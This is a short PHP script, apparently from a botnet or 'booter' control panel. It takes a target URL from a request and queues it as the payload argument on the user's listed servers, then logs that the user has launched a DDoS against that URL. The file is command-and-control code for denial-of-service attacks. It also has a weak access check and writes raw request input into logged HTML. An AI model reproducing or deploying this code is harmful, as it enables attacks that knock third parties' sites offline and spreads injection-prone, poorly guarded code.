<?php

include('../class/include.php');
if (!Account::isAuthentified() && !CSRF::isAjaxRequest())
{
    die("Bad request");
}
$GLOBALS['DB']->Update('server_list', ['userid' => $_SESSION["id"]], ['payload_arg' => $_POST["url"], "payload_call" => "116"]);
Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;L'utilisateur ".$_SESSION["id"]." a DDOS ".$_GET["url"]."</p>");
?>

